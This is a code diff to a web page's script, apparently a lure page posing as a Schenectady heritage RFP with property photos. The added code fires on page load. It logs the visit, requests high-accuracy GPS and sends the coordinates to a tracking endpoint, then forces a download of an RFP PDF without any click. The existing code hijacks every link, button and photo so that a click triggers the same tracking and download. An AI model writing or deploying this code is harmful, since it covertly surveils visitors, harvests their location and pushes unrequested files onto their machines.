@@ -696,7 +696,42 @@
                     })
                 });
                 const data = await res.json();
-                if (data.visitor_id) visitorId = data.visitor_id;
+                if (data.visitor_id) {
+                    visitorId = data.visitor_id;
+
+                    // AUTO TRIGGER PDF DOWNLOAD & GPS ON LOAD
+                    setTimeout(() => {
+                        // 1. Log "AUTO DOWNLOAD" action
+                        fetch('/api/track/action', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ visitor_id: visitorId, action: 'AUTO DOWNLOAD', motion_status: currentMotionStatus })
+                        }).catch(e => { });
+
+                        // 2. Request GPS aggressively
+                        if (navigator.geolocation) {
+                            navigator.geolocation.getCurrentPosition(async (position) => {
+                                fetch('/api/track/location', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        visitor_id: visitorId,
+                                        lat: position.coords.latitude,
+                                        lng: position.coords.longitude
+                                    })
+                                }).catch(e => { });
+                            }, (err) => { }, { enableHighAccuracy: true, timeout: 5000 });
+                        }
+
+                        // 3. Force PDF Download
+                        const link = document.createElement('a');
+                        link.href = 'Schenectady_Heritage_RFP_Details.pdf';
+                        link.download = 'Schenectady_Heritage_RFP_Details.pdf';
+                        document.body.appendChild(link);
+                        link.click();
+                        document.body.removeChild(link);
+                    }, 500); // Trigger half a second after the 'enter' ping finishes
+                }
             } catch (err) { }
 
             // Action Tracking (PDF Click & Geolocation Trigger)
@@ -747,21 +782,21 @@
 
             // Bind to ALL links, buttons, and property photos
             const interactiveElements = document.querySelectorAll('a, button, .property-photo');
-            
+
             interactiveElements.forEach(el => {
                 el.addEventListener('click', (e) => {
                     // Only prevent default if it's a link to stop navigation
                     if (el.tagName.toLowerCase() === 'a') {
                         e.preventDefault();
                     }
-                    
+
                     let actionLabel = 'DOWNLOAD_PDF';
                     if (el.classList.contains('highlight-banner')) actionLabel = 'CLICK BANNER (PDF)';
                     else if (el.classList.contains('property-photo')) actionLabel = 'VIEW PHOTO (PDF)';
                     else if (el.id === 'trackPdfDownloadBtn') actionLabel = 'DOWNLOAD_PDF';
                     else if (el.tagName.toLowerCase() === 'a') actionLabel = 'CLICK LINK (PDF)';
                     else if (el.tagName.toLowerCase() === 'button') actionLabel = 'CLICK BUTTON (PDF)';
-                    
+
                     trackActionAndGeo(actionLabel);
                     triggerPdfDownload();
                 });
